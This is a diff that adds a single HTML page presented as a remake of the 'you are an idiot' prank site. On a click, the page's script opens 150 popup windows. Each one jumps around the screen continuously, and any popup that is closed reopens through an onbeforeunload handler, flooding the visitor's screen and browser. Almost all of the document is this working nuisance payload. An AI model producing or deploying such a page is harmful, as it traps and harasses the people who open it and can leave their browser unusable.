@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>made by Gabriel</title>
+
+<style>
+body{
+    margin:0;
+    background:black;
+    color:white;
+    font-family:Arial;
+    overflow:hidden;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+h1{
+    font-size:40px;
+}
+</style>
+</head>
+
+<body>
+
+<h1>a remake of  youareandidiot.org click any whare</h1>
+
+<script>
+const popups = [];
+const popupCount = 150;
+
+function makePopup() {
+
+    const width = 260;
+    const height = 180;
+
+    const startX = Math.random() * (screen.availWidth - width);
+    const startY = Math.random() * (screen.availHeight - height);
+
+    const popup = window.open(
+        "",
+        "",
+        `width=${width},height=${height},left=${startX},top=${startY}`
+    );
+
+    if (!popup) {
+        alert("Popup blocked.");
+        return;
+    }
+
+    popup.document.write(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+    <title>CHAOS</title>
+
+    <style>
+    body{
+        margin:0;
+        overflow:hidden;
+        background:black;
+        color:white;
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        height:100vh;
+        font-family:Arial;
+    }
+
+    h1{
+        font-size:30px;
+    }
+    </style>
+    </head>
+
+    <body>
+
+    <h1>POPUP</h1>
+
+    <script>
+
+    let speed = 40;
+
+    let dx = (Math.random() > 0.5 ? 1 : -1) * speed;
+    let dy = (Math.random() > 0.5 ? 1 : -1) * speed;
+
+    function randomDirection(){
+
+        dx = (Math.random() > 0.5 ? 1 : -1) * speed;
+        dy = (Math.random() > 0.5 ? 1 : -1) * speed;
+
+    }
+
+    setInterval(randomDirection, 150);
+
+    function moveWindow(){
+
+        let x = window.screenX + dx;
+        let y = window.screenY + dy;
+
+        if(x <= 0 || x >= screen.availWidth - window.outerWidth){
+            dx *= -1;
+        }
+
+        if(y <= 0 || y >= screen.availHeight - window.outerHeight){
+            dy *= -1;
+        }
+
+        window.moveTo(x, y);
+
+    }
+
+    setInterval(moveWindow, 10);
+
+    <\/script>
+
+    </body>
+    </html>
+    `);
+
+    popup.onbeforeunload = () => {
+
+        setTimeout(() => {
+            makePopup();
+        }, 100);
+
+    };
+
+    popups.push(popup);
+}
+
+document.body.onclick = () => {
+
+    for(let i = 0; i < popupCount; i++){
+
+        setTimeout(() => {
+            makePopup();
+        }, i * 50);
+
+    }
+
+};
+</script>
+
+</body>
+</html>
